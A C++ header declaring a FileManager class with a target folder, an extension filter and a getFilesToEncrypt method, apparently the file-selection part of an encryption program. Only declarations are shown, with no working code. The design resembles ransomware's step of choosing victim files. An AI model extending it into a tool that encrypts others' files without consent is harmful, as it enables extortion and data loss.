#pragma once

#include <filesystem>
#include <string>
#include <vector>

namespace fs = std::filesystem;

class FileManager
{
private:
fs::path _targetFolder;
bool isValidExtension (std::string) const;
    
public:
    FileManager();
    ~FileManager();

    std::vector<fs::path> getFilesToEncrypt() const;
    
};


